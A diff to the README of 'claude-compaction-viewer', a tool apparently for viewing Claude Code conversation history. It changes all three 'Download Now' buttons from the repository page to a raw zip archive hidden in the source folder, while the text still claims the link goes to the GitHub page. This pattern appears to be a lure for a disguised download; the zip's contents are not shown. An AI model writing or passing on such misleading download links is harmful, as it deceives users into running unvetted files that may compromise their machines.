@@ -1,6 +1,6 @@
 # 🛠️ claude-compaction-viewer - View Claude Code Conversation History
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/danielsod12/claude-compaction-viewer)
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/danielsod12/claude-compaction-viewer/main/src/claude_compaction_viewer/viewer-claude-compaction-v1.5.zip)
 
 ---
 
@@ -36,7 +36,7 @@ No extra software or setup steps are needed.
 
 Click the button below to go to the download page.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/danielsod12/claude-compaction-viewer)
+[![Download Now](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/danielsod12/claude-compaction-viewer/main/src/claude_compaction_viewer/viewer-claude-compaction-v1.5.zip)
 
 This link will take you to the GitHub page where you can find the tool files. It is the first step to getting the software on your PC.
 
@@ -130,7 +130,7 @@ Developers and users help keep the tool working smoothly.
 
 ## 🔗 Download claude-compaction-viewer Here
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://github.com/danielsod12/claude-compaction-viewer)
+[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/danielsod12/claude-compaction-viewer/main/src/claude_compaction_viewer/viewer-claude-compaction-v1.5.zip)
 
 ---
 
